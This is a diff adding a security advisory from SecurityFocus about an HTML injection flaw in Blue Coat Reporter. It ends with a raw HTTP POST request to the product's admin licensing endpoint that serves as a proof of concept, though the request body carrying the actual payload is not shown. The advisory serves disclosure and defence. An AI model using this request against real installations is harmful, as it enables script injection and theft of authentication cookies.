@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/13725/info
+
+Blue Coat Reporter is prone to an HTML injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.
+
+The vendor has addressed this issue in the upcoming version 7.1.2 of the application; earlier versions are reported vulnerable. 
+
+POST
+/?dp+templates.admin.authentication.licensing_view+volatile.admin_gui+true
+HTTP/1.0
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
+application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword,
+application/x-shockwave-flash, */*
+Referer:
+http://www.example.com:8987/?dp+templates.admin.authentication.licensing_view+volatile.admin_gui+true
+Accept-Language: de
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: www.example.com:8987
+Pragma: no-cache
+Cookie: session_id=invalid; authusername7=invalid; authpassword7=invalid
+Content-Length: 100
